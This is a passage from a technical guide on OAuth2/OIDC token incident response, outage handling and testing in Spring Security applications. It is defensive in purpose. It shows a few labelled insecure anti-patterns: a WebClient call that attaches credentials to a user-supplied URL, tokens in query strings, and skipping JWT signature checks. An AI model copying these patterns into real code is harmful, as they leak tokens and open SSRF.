| `invalid_scope` | No retries with same scope | Fix permissions/consent |
| Resource Server 401 `invalid_token` | Evict stale client if appropriate | Never auto-retry POST blindly |
| Resource Server 403 `insufficient_scope` | Never bypass with admin token | Require valid user/admin consent |
| Revocation Endpoint 503 | Retry later; assume token still exists | RFC 7009 |
| Revocation Endpoint 200 | Do not retry just because body is empty | Revocation state achieved per protocol |

### 19.1. Exponential Backoff with Jitter

Illustrative formula:

~~~text
delay = min(maxDelay, baseDelay * 2^attempt)
actualDelay = randomWithin(0, delay)
~~~

The goal is preventing thousands of instances from hammering the Token Endpoint every second when a provider recovers. Cap attempts and scope circuit breakers per **provider endpoint/registration**, not one global breaker shared across every Identity Provider.

### 19.2. Respect `Retry-After`

If a provider returns:

~~~http
HTTP/1.1 429 Too Many Requests
Retry-After: 30
~~~

follow the provider contract and cap concurrency. There is no magic "30 seconds for every error" rule if policy differs; retry timing should derive from the response or structured config.

### 19.3. Retries Do Not Apply Equally to Every HTTP Method

`GET` requests usually carry fewer side effects. For `POST` requests creating reports, transferring funds, or revoking tokens, account for **idempotency** and unknown outcome states after timeouts. Never replay sensitive operations endlessly when the server may already have executed them.

## 20. Per-Provider Circuit Breakers and Bulkheads

~~~mermaid
flowchart LR
    A["Integration A"] --> C["Circuit Breaker: OP A"]
    B["Integration B"] --> D["Circuit Breaker: OP B"]
    C --> E["Token Endpoint A"]
    D --> F["Token Endpoint B"]
    C --> G["Fallback: temporary error / queue"]
    D --> H["Fallback: temporary error / queue"]
~~~

### 20.1. Circuit Breakers Never Replace Authorization

When a breaker opens, the application can pause token refreshes or profile syncs. Never fall back to:

- Anonymous access on endpoints requiring authentication.
- Unvalidated ID Tokens.
- Tokens from a different provider.
- Higher-privilege Client Credentials.
- Credentials hardcoded in source code.

### 20.2. Bulkheads

Cap concurrency per provider, endpoint, and tenant. If Provider A stalls, prevent it from exhausting threads or connection pools and starving Provider B or internal features.

### 20.3. Queuing During Provider Outages

For non-real-time synchronization work:

~~~text
Scheduled sync -> provider unavailable
             -> retryable event in queue
             -> exponential backoff + TTL
             -> dead-letter/alert if expired
~~~

Never put plaintext Access Tokens or Refresh Tokens inside queue payloads. Store only the **connection key / operation ID**, letting workers fetch credentials from the encrypted authorized client store when permitted.

## 21. OIDC Discovery and JWKS Failures: Never Disable Signature Checks

When an OP fails to serve JWKS, code is often tempted to do:

~~~text
JWT verify failed because JWKS unavailable
  -> accept token with signature validation disabled
~~~

This is a **critical vulnerability**. Never accept `alg=none`, arbitrary issuers, tokens with the wrong audience, expired tokens, or request-supplied public keys.

### 21.1. Cached Signing Keys

Frameworks/decoders can cache JWKS per policy. Cached keys can validate previously issued tokens during a brief provider outage, **only if tokens still pass issuer/audience/expiry/algorithm validation and cache policy allows it**.

Never treat "cache forever" as an outage strategy: providers can **rotate or revoke signing keys after a compromise**. Respect cache semantics and support controlled refresh/recovery when a new key ID appears.

### 21.2. Routine Key Rotation vs. Signing Key Compromise

| Scenario | Response direction |
| --- | --- |
| OP adds a new JWKS key | Refresh key cache per metadata/trust config |
| OP uses new `kid` not yet propagated | Bounded retry fetch, alert, never bypass verification |
| OP announces compromised signing key | Follow incident advisory, reject compromised keys per policy |
| OIDC issuer changes unexpectedly | Never normalize away mismatches; verify official change |
| OP TLS certificate changes | Verify chain/hostname and roll out trust updates under control |

### 21.3. Never Auto-Trust New Issuers from Token Claims

The `iss` claim and `jku`/`x5u` headers in a JWT are untrusted data before verification. Never fetch arbitrary URLs found there to download signing keys; doing so causes token substitution, SSRF, and false trust.

## 22. Leaked Client Secrets or Private Keys: Do Not Stop at User Token Revocation

If a **confidential OAuth2 client** leaks its Client Secret:

1. Identify all registrations/tenants using that secret.
2. Block unauthorized access and disable/quarantine credentials if needed.
3. Rotate the secret at the OP and secret manager, using a safe overlap window only if permitted by risk policy.
4. Roll out updated service instances without logging secrets.
5. Assess whether any grants were abused; consider revoking affected grants and Refresh Tokens.
6. Audit service-to-service Client Credentials tokens and refresh keys/tokens where needed.
7. Revoke the old secret after confirming workloads shifted to the new secret.
8. Monitor `invalid_client` spikes and attempts targeting the affected client ID.

**Secret rotation does not automatically revoke previously issued Access Tokens**, depending on the OP and Resource Server.

### 22.1. Private Keys for `private_key_jwt`

If the private key signing client assertions is leaked, rotate/revoke the key registration and investigate whether an attacker signed assertions, rather than merely clearing a user session.

### 22.2. mTLS/DPoP Sender-Constrained Tokens

RFC 9700 recommends sender-constrained Access Tokens to mitigate replay; options include **mTLS (RFC 8705)** and **DPoP (RFC 9449)** where supported by provider, client, and Resource Server.

Keep in mind:

- If the sender's private key is also leaked, sender-constraint protection can be lost.
- DPoP proofs, nonces, and key lifecycles must strictly obey the specification.
- Adding an arbitrary HTTP header does not make a token DPoP-bound.
- Both OP and Resource Server must enforce sender-constraining validation.

## 23. Token Leaked in Logs: Practical Response

A common incident:

~~~text
DEBUG HTTP client logging:
  Authorization: Bearer eyJ...SENSITIVE...
~~~

**The first step is NOT pasting the token into a public ticket.** Instead:

1. Stop the log source and fix redaction configuration.
2. Restrict access, retention, and export permissions on existing logs.
3. Determine exposure duration and affected services, users, and tenants.
4. Revoke or quarantine tokens/grants according to risk.
5. Inspect access/audit logs to assess whether data was downloaded.
6. Scrub/redact copies in affected channels while respecting forensic evidence rules.
7. Add automated tests/linters to the logging pipeline.

### 23.1. What Must Never Be Logged

- `Authorization: Bearer ...`.
- Raw Access Tokens, Refresh Tokens, and ID Tokens.
- Client Secrets, private keys, PKCE verifiers, authorization codes.
- Entire `OAuth2AuthorizedClient` or `OAuth2AuthenticationToken` objects.
- Session cookies, CSRF tokens, UserInfo responses containing PII.
- Form bodies sent to Token or Revocation Endpoints.

A safe structured event:

~~~text
event=oauth2_authorized_client_invalidated
registration_id=corporate
principal_type=user
tenant_alias=tenant-a
reason_category=provider_invalid_grant
action=reauth_required
correlation_id=internal-evt-7a42
~~~

This is an **illustrative format**, not Spring Security's default log output. When storing principal identifiers, enforce masking, retention, and access policies.

## 24. Preventing Continued Token Leakage During an Active Incident

### 24.1. Never Send Tokens to Arbitrary Destinations

Anti-pattern:

~~~java
webClient.get()
    .uri(userSuppliedUrl)
    .attributes(clientRegistrationId("admin-service"))
    .retrieve();
~~~

This code can send a Bearer Token straight to an attacker's host. Enforce:

- Host/scheme allowlists and DNS/redirect controls.
- Dedicated `WebClient` instances per Resource Server.
- Never attaching default OAuth2 credentials on a multi-URL `WebClient`.
- Validating token audience and principal/tenant prior to outbound calls.

### 24.2. Redirect Chains Must Be Controlled

`baseUrl` does not act as a host allowlist; passing an absolute URI overrides the base URL. Never assume an HTTP client strips `Authorization` headers safely across cross-host redirects. Restrict redirects on credential-bearing clients.

### 24.3. Never Put Tokens in Query Strings

Do not do:

~~~text
GET https://api.example.net/reports?access_token=REAL_TOKEN
~~~

Query strings routinely leak through logs, browser history, proxies, and analytics. Use the Bearer `Authorization` header over HTTPS per the provider/API contract.

## 25. Incident Data Model and Audit Trail

An application-level data model:

~~~text
oauth2_connection
  id
  tenant_id
  principal_key
  registration_id
  state: ACTIVE | SUSPENDED | REVOKING |
         PENDING_REVOCATION | REAUTH_REQUIRED |
         DEGRADED | DISCONNECTED
  state_version
  last_error_category
  updated_at

oauth2_security_event
  id
  connection_id
  event_type
  severity
  detected_at
  action_taken
  correlation_id
~~~

Never store raw tokens in audit tables. If a token must be retained briefly to complete revocation after an outage, use a separate encrypted restricted store with strict ownership and lifecycle bounds.

### 25.1. Why Is a State Version Needed?

A worker mid-refresh could persist a new Access Token right after the incident service marked `SUSPENDED`. Updating state without a version check lets the worker accidentally flip the connection back to active.

~~~sql
-- Illustrative compare-and-swap SQL, not a complete migration.
UPDATE oauth2_connection
SET state = 'SUSPENDED',
    state_version = state_version + 1
WHERE id = :connection_id
  AND state_version = :expected_version;
~~~

If zero rows are affected, a concurrent change occurred; re-read state and reconcile against policy. Likewise, when providers rotate Refresh Tokens, use atomic saves or conditional deletes so newer tokens are not lost.

### 25.2. Separate the Token Store from Security State

One pattern:

~~~text
Connection State Store
    |
    +-- ACTIVE? -> worker permitted to call
    +-- SUSPENDED? -> block all usage
    +-- REAUTH_REQUIRED? -> prompt re-consent
    +-- DEGRADED? -> retry per policy

Encrypted Authorized Client Store
    |
    +-- Access/Refresh Token + registration/principal
~~~

Even if a process has read access to the encrypted store, once connection state is `SUSPENDED`, the application layer must **block credential usage**.

## 26. User Experience and Incident Messaging

Users should never see raw stack traces or secrets like:

~~~text
OAuth2AuthorizationException:
invalid_grant, client_secret=...
refresh_token=...
~~~

Instead, tailor messaging to the issue class:

| State | Appropriate message |
| --- | --- |
| `REAUTH_REQUIRED` | "Your connection has expired. Please reconnect to continue." |
| `DEGRADED` | "The provider is currently experiencing issues. Data will sync again once connectivity recovers." |
| `SUSPENDED` due to risk | "This connection has been paused to protect your account. Please complete the verification step." |
| `PENDING_REVOCATION` | "Your disconnect request is processing; some permissions may still be awaiting provider revocation confirmation." |
| `DISCONNECTED` | "The connection has been disconnected according to policy." |

### 26.1. Do Not Misattribute Fault to the User

If the OP returns 503, never display "You revoked access." If the OP returns `invalid_grant`, never state definitively "Your account was hacked." Use neutral language and clear next steps.

### 26.2. Reconnect Must Use the Official OAuth2 Flow

A "Reconnect" button should route users to the configured `/oauth2/authorization/{registrationId}` endpoint, preserving proper authorization requests, `state`, PKCE, and redirect URI. Never ask users for their provider password inside an RP form.

### 26.3. Avoid Notification Storms

If an outage impacts hundreds of thousands of connections, batch alerts per incident and provider instead of emailing on every failed token refresh. Confirmed credential compromises may follow distinct notification procedures required by law and policy.

## 27. What Should Monitoring and Alerting Track?

| Metric/Event | Meaning |
| --- | --- |
| `oauth2_token_refresh_success` by provider | Normal refresh health |
| `oauth2_token_refresh_invalid_grant` | Invalid token/grant or rotation race |
| `oauth2_token_endpoint_invalid_client` | Wrong client credential or auth method |
| `oauth2_api_invalid_token` | Resource Server rejected Access Token |
| `oauth2_api_insufficient_scope` | Insufficient API permissions |
| `oauth2_provider_5xx` | OP/AS outage |
| `oauth2_provider_429` | Rate limiting |
| `oauth2_revoke_pending` / `success` | Tracks revocation backlog |
| `oauth2_connection_suspended` | Containment scope |
| `oauth2_reauth_required` | Connections awaiting user intervention |
| `oauth2_jwks_refresh_failure` | Signing key discovery/rotation issue |
| `oauth2_token_leak_detection` | Secret scanner or audit alert |

### 27.1. Alerts Differ from Metric Dashboards

Signals warranting urgent alerts include:

- Sudden `invalid_grant` spike across many users of the same provider.
- `invalid_client` across all pods right after secret rotation.
- Increased Token Endpoint timeouts right after deployment.
- Anomalous token usage from unexpected IPs, geographies, or devices.
- Unusual KMS decryption spikes paired with database exfiltration indicators.
- Revocation backlog growing beyond SLO.
- A registration unexpectedly calling an unapproved Resource Server host.

### 27.2. Avoid High-Cardinality Labels and PII

Never use Access Tokens, Refresh Tokens, full `sub` values, `jti`, or session IDs as metric labels. Use provider alias, error code, environment, connection state, and aggregate counts; perform detailed drill-downs via access-controlled audit stores.

## 28. Coordination Across Dev, Security, Operations, and Provider

| Team | Responsibilities |
| --- | --- |
| Application team | Isolate connections, fix token flows, deploy updates, test |
| Security/Incident Response | Triage incidents, preserve evidence, assess scope, notification policy |
| IAM/Identity team | Client registrations, consent, grant revocation, secret/key rotation |
| SRE/Operations | Traffic management, retries, circuit breakers, provider status, rollouts |
| Data/Privacy | Assess affected data, retention, and regulatory notifications |
| External Provider Support | Confirm token family revocation, incident behavior, OP constraints |

Never let a background job automatically "wipe all user credentials" solely because a provider status API reports an incident, unless incident command approves that scope.

### 28.1. When a Provider Reports an Outage

Minimum facts to confirm:

- Which endpoints, regions, or tenants are affected?
- Is auth/login, Token Endpoint, JWKS, UserInfo, or downstream API impacted?
- Does the provider have a status page, incident ID, and ETA/recovery guidance?
- Did client credentials, signing keys, or consent policies change?
- Is rotation/reauthorization needed, or simply retrying once recovered?

Maintain degraded-mode functionality where allowed, **without ever bypassing authentication**.

## 29. Testing Failure Modes and Recovery

### 29.1. Testing the Token Endpoint

| Scenario | Expectation |
| --- | --- |
| Successful refresh with token rotation | Persist new Access/Refresh Tokens atomically |
| `invalid_grant` due to revoked token | Stop retrying old token infinitely; set `REAUTH_REQUIRED` |
| `invalid_grant` due to concurrent refresh | Do not overwrite newer token from sibling request |
| `invalid_client` | Alert/surface config failure; avoid Token Endpoint storm |
| `invalid_scope` | Never escalate scopes automatically |
| HTTP 503 | Preserve credentials; surface transient error/backoff |
| Network timeout | Bounded retry; protect local token state |
| Client Secret rotation | Pods adopt new secret on rollout; old secret safely revoked |

### 29.2. Testing the Resource Server Integration

| Scenario | Expectation |
| --- | --- |
| 200 with valid Access Token | No unnecessary refresh |
| 401 + `invalid_token` | Failure handler evicts stale client when policy/code apply |
| 403 + `insufficient_scope` | Never switch to admin registration |
| 403 business ACL | Return forbidden per contract; retain Refresh Token |
| 503 | API degraded; do not request fresh tokens infinitely |
| Cross-host redirect | Never forward Bearer Token to arbitrary hosts |
| Retry `POST` after timeout | Avoid duplicate side effects |

### 29.3. Testing Incident Workflows

| Scenario | Expectation |
| --- | --- |
| Quarantine a user connection | Both jobs and controllers cease using that token |
| Revocation 200 | Record valid completion; clean up local state |
| Revocation 503 | Stay pending; do not report revocation complete |
| Revocation of already-invalid token | 200 handled idempotently |
| Revocation `unsupported_token_type` | Escalate or apply fallback per provider contract |
| Quarantine raced by stale worker save | Connection does not revert to `ACTIVE` |
| Token leak via logs | Secret redaction test catches leakage |
| Multi-instance cache | Invalidation propagates across nodes |
| Compromised OP signing key | Reject tokens signed with revoked key |
| OP down, active session | Local security policy never bypassed |

### 29.4. Mock OP vs. Production Provider

Unit testing a manager with mock tokens does not prove a real OP supports revocation, refresh rotation, DPoP, or mTLS. Run provider sandbox/contract tests using test client registrations without putting production secrets into fixtures or logs.

### 29.5. Bounded Chaos Testing

In authorized test environments:

- Temporarily block Token Endpoint / DNS to measure retry behavior.
- Simulate 429/503 responses with `Retry-After`.
- Trigger concurrent refreshes on the same authorized client.
- Verify circuit breakers do not cascade across providers.
- Confirm recovery after outage does not create a request burst.

Never use real users' tokens or revoke production grants "just to test" without operational scope and approval.

## 30. Real-World Scenarios

### Scenario A — Access Token Exposed in HTTP Access Logs

A WebClient interceptor accidentally logs the `Authorization` header.

**Response:** disable logging, lock down log access, inspect token scope/expiry, revoke if supported, monitor for unauthorized usage, and add redaction regression tests. Do not simply delete local log files and declare the incident closed.

### Scenario B — Refresh Tokens Exposed in a Database Backup

A snapshot contains Refresh Tokens for many users.

**Response:** isolate the store/backup, determine scope, audit encryption keys and KMS access, revoke grants/token families as needed, put connections in quarantine/reauth, and evaluate notification obligations. Rotating the encryption key does not automatically revoke Refresh Tokens that were already extracted in plaintext.

### Scenario C — User Revoked Consent at the Provider

The next refresh attempt returns `invalid_grant`.

**Response:** stop using the old Refresh Token, delete/quarantine the local authorized client for that exact principal, and mark reconnection required. Never silently fall back to a higher-privilege token from another registration.

### Scenario D — OP Token Endpoint Returns 503

Thousands of scheduled jobs try to refresh simultaneously.

**Response:** retain Refresh Tokens and enforce circuit breakers, backoff with jitter, and appropriate queuing. Do not mark every user `REAUTH_REQUIRED` and do not retry every 100 ms.

### Scenario E — Two Requests Refresh the Same Token

Request A receives R2; Request B uses old R1 and receives `invalid_grant`.

**Response:** use transactions/CAS or single-flight locking so B does not wipe A's R2. Observe OP replay policy rather than assuming theft from a single race.

### Scenario F — API Returns 403 After Admin Changes Permissions

The Reports API returns `insufficient_scope`.

**Response:** confirm updated permissions and update consent/registration through official workflows; never fall back to admin client credentials or retry infinitely.

### Scenario G — Client Secret Committed to a Public Repository

A machine Client Credentials application could be impersonated.

**Response:** rotate/revoke the client secret at the OP, roll out across all instances, revoke affected grants/tokens per provider support, scan git history, and audit token issuance. Removing only the latest commit does not make an exposed secret safe again.

### Scenario H — OP JWKS Endpoint Unreachable

A user logs in with an ID Token signed by an uncached `kid`.

**Response:** never skip JWT signature verification; apply bounded retries/key refreshes per trust policy, show a temporary error, or fail closed. Never fetch public keys from an attacker-controlled JWT header URL.

### Scenario I — User Logs Out, Yet the API Still Accepts the JWT

The RP session is invalidated while the Access Token remains unexpired.

**Response:** recognize that session invalidation differs from token revocation; design short TTLs, introspection/denylists, or OP token revocation per contract and risk.

### Scenario J — Revocation Endpoint Returns 503 While User Clicks Disconnect

The app deletes the Refresh Token immediately and then revocation fails.

**Response:** switch to `REVOKING`/`PENDING_REVOCATION` state, an encrypted pending queue, and bounded retries; never claim the provider revoked the token without confirmation.

### Scenario K — DPoP Key Also Compromised

The Access Token is sender-constrained, yet the attacker possesses its private key.

**Response:** treat sender-binding as broken and revoke tokens/keys/registrations per policy. Never assume DPoP protects you once its private key is stolen.

### Scenario L — Corporate Logout Deletes Partner Tokens

The application deletes every authorized client keyed by user email.

**Response:** scope deletions by exact issuer/registration/principal/tenant, keeping connection lifecycles independent; email is not a stable identity key.

### Scenario M — Provider A Outage While Provider B Is Healthy

A single global circuit breaker blocks all OIDC Logins.

**Response:** scope bulkheads and circuit breakers per issuer/registration so Provider A's failure does not impact Provider B when trust policies permit independent operation.

### Scenario N — Browser Session Hijacked

An attacker reuses a user's `JSESSIONID`.

**Response:** invalidate the local session, audit cookies/XSS/CSRF, require step-up/re-authentication, and if secondary OAuth2 token exposure occurred, handle OAuth2 revocation separately.

## 31. Pre-Production Response Checklist

| Question | Required control |
| --- | --- |
| Are Access/Refresh/Client Secret/private key incidents classified separately? | Dedicated incident playbooks |
| Can tokens enter logs? | Header/body redaction, tests |
| Where are tokens stored? | Inventory of JDBC, sessions, Redis, backups |
| Are tokens encrypted at rest? | Encrypted store, KMS policy, key rotation |
| Does quarantine block all workers? | Shared state, TTL, versioning |
| Is local deletion distinguished from provider revocation? | Clear RFC 7009 workflow |
| Does the OP support `revocation_endpoint`? | Discovery/provider contract verified |
| Is Revocation 200 interpreted accurately? | Revoked or already invalid |
| Is Revocation 503 interpreted accurately? | Token may still be valid |
| Is `invalid_grant` handled cleanly? | Reauth, concurrency, replay investigation |
| Does `invalid_client` alert? | Secret/key rotation workflow |
| Are 401/403 responses triaged by Bearer error? | No blind deletion or privilege escalation |
| Do managers/filters target the right repository/service? | Wiring audit |
| Are WebClient hosts and redirects allowlisted? | Token exfiltration / SSRF defense |
| Is refresh rotation persisted atomically? | CAS / single-flight |
| How are Token Endpoint outages handled? | Backoff/jitter/circuit breaker |
| How are OP/JWKS outages handled? | Never bypass JWT validation |
| Are metrics free of PII? | Provider/error buckets, sanitized audits |
| Is multi-tenant isolation enforced? | Scoped by issuer/registration/principal/tenant |
| Do user-facing errors match the root cause? | Reauth vs. degraded vs. quarantine |
| Are provider escalation contacts documented? | Incident runbook/owners |
| Are revoke/timeout/race cases tested? | Mock OP + integration + chaos tests |
| Are recovery and notification policies defined? | Approvals, forensics, retrospective |

## 32. Review Questions

**1. Does an HTTP 401 from a Resource Server prove the Access Token was stolen?**

No. The token might be expired, carry the wrong issuer/audience, or have been revoked. Inspect Bearer errors, provider contracts, and supporting security telemetry.

**2. Is `invalid_grant` always caused by an attacker replaying a Refresh Token?**

No. It can result from revoked user consent, expiration, or a concurrent refresh race. Classify and investigate carefully.

**3. Why shouldn't you delete the Refresh Token before calling the revocation endpoint?**

Because if the provider times out or returns 503, the app loses the only copy of the credential needed to retry revocation. Use quarantine and an encrypted pending revocation workflow instead.

**4. Does HTTP 200 from RFC 7009 mean the token previously existed?**

No. The endpoint also returns 200 when a token is already invalid so it avoids leaking token existence.

**5. Should you delete the authorized client if the Token Endpoint returns 503?**

Not by default. That is a transient failure; preserve state and retry with bounds. Deleting records can force huge numbers of users through unnecessary re-consent.

**6. Does `removeAuthorizedClient` revoke tokens at the OP?**

No. It modifies only Spring Security's local store. The Revocation Endpoint is a separate protocol step.

**7. Does OIDC logout guarantee a JWT Access Token immediately stops working at APIs?**

No. Local/OP session logout and Access Token revocation have independent lifecycles.

**8. Why must manager-constructed WebClient filters be inspected carefully?**

Because certain Servlet/Reactive WebClient filters constructed with a manager do not forward Resource Server 401/403 responses to failure handlers automatically; configure explicit failure handlers when eviction is needed.

**9. When OP JWKS fails, may you accept unverified tokens to preserve uptime?**

No. Maintain signature, issuer, audience, and expiry checks, and degrade or fail closed per policy.

**10. Do sender-constrained Access Tokens stop all token theft?**

No. They mitigate replay when an attacker lacks the sender key; if the key is also leaked or validation is flawed, risk remains.

## 33. References

- OAuth 2.0 Security Best Current Practice — RFC 9700: https://www.rfc-editor.org/rfc/rfc9700
- OAuth 2.0 Token Revocation — RFC 7009: https://www.rfc-editor.org/rfc/rfc7009
- OAuth 2.0 Bearer Token Usage — RFC 6750: https://www.rfc-editor.org/rfc/rfc6750
- OAuth 2.0 Authorization Framework — RFC 6749: https://www.rfc-editor.org/rfc/rfc6749
- OAuth 2.0 Token Introspection — RFC 7662: https://www.rfc-editor.org/rfc/rfc7662
- OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens — RFC 8705: https://www.rfc-editor.org/rfc/rfc8705
- OAuth 2.0 Demonstrating Proof of Possession (DPoP) — RFC 9449: https://www.rfc-editor.org/rfc/rfc9449
- JSON Web Token Best Current Practices — RFC 8725: https://www.rfc-editor.org/rfc/rfc8725
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- OpenID Connect RP-Initiated Logout 1.0: https://openid.net/specs/openid-connect-rpinitiated-1_0.html
- OpenID Connect Back-Channel Logout 1.0: https://openid.net/specs/openid-connect-backchannel-1_0.html
- Spring Security — Servlet OAuth2 Client Core: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/core.html
- Spring Security — Servlet OAuth2 Authorized Clients: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html
- Spring Security — Reactive OAuth2 Client Core: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/core.html
- Spring Security — Servlet OIDC Logout: https://docs.spring.io/spring-security/reference/servlet/oauth2/login/logout.html
- Spring Security — Reactive OIDC Logout: https://docs.spring.io/spring-security/reference/reactive/oauth2/login/logout.html
- Spring Security — `DefaultOAuth2AuthorizedClientManager` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/web/DefaultOAuth2AuthorizedClientManager.html
- Spring Security — `ServerOAuth2AuthorizedClientExchangeFilterFunction` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/web/reactive/function/client/ServerOAuth2AuthorizedClientExchangeFilterFunction.html
- Spring Security — `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/RemoveAuthorizedClientOAuth2AuthorizationFailureHandler.html
- Spring Security — `RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler.html
- OWASP Secrets Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- OWASP Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

## 34. Conclusion: Never Let "Token Error Handling" Become a Security Vulnerability

~~~text
Event occurs:
  |
  +-- Suspected stolen token
  |      -> incident triage / quarantine
  |      -> revoke token/grant or rotate client key
  |      -> clean up local clients + sessions if needed
  |      -> reauthorize/recover + monitor
  |
  +-- Revoked permissions / invalid_grant
  |      -> stop using old refresh token
  |      -> distinguish consent revocation vs. refresh race
  |      -> REAUTH_REQUIRED when appropriate
  |      -> never auto-escalate scope/admin
  |
  +-- Provider outage / 429 / 503
         -> preserve valid credentials
         -> bounded retry, jitter, circuit breaker
         -> degraded UX, no auth bypass
         -> verify recovery, no token storm

Distinguish:
  removeAuthorizedClient != revoke at Authorization Server
  local/OP logout != Access Token revocation
  invalid_grant != confirmed token theft
  provider outage != user revoked consent
  JWT signature cache != permission to skip validation
~~~

**Six Core Principles to Remember:**

1. **Classify the error source and code before acting.** Token Endpoint `invalid_grant`, Resource Server `invalid_token`/`insufficient_scope`, and provider 503 carry distinct meanings.
2. **Credential compromise demands an incident workflow**, encompassing containment, scope assessment, revocation/rotation, monitoring, and reauthorization. Clearing a token cache is never a complete response.
3. **RFC 7009 defines explicit semantics:** 200 means revocation succeeded or the token was already invalid; 503 means the token cannot be assumed revoked yet. Never delete the sole copy without a pending-revocation plan.
4. **Refresh Token rotation requires concurrency control.** `invalid_grant` can stem from replay or a benign race; optimistic locking/single-flight avoids deleting newly rotated tokens.
5. **Provider outages never permit security downgrades.** Bounded retries, jitter, circuit breakers, and degraded modes must preserve OIDC, tenant, and Resource Server validation.
6. **Spring Security managers and filters are only part of the system.** Failure handlers evict stale authorized clients, while token theft, key rotation, user communication, cross-node invalidation, and forensic evidence require coordinated application and security operations.

An OAuth2/OIDC Client application is truly resilient only when it can **disconnect with surgical scope**, **halt use of suspected leaked credentials**, **respect revoked permissions**, and **weather provider outages without breaking security boundaries**.
